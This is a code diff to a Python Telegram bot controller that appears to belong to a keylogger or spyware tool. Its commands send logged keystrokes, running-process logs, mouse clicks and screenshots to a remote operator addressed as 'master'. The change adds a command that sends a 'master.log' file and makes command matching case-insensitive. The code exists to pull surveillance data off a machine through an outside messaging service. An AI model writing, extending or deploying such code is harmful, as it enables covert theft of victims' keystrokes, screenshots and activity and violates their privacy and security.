@@ -71,10 +71,12 @@ class TelegramController(BaseController):
             "log keys": self._onLogKeys,
             "log proc": self._onLogProc,
             "log mouse": self._onLogMouse,
+            "log master": self._onLogMaster,
             "send ss": self._onSendScreenshot
         }
 
     def _handleMessage(self, message: str):
+        message = message.lower()
         try:
             logger.info(f"Got command: `{message}` from admin")
             self.callbacks[message]()
@@ -130,6 +132,11 @@ class TelegramController(BaseController):
         self.bot.sendDocument(file)
         logger.info("Sending document: mouse/clicks.log")
 
+    def _onLogMaster(self):
+        file = output.Path().getRootDir() / "master.log"
+        self.bot.sendDocument(file)
+        logger.info("Sending document: master.log")
+
     def _onUnknownCommand(self):
         self.bot.sendText("I didn't get you master :(")
         self._sendHelpText()
@@ -139,3 +146,4 @@ class TelegramController(BaseController):
         file = output.Path().getRootDir() / "latestss.jpg"
         saveScreenShot(file)
         self.bot.sendPhoto(file)
+        logger.info("Sending image: latestss.jpg")
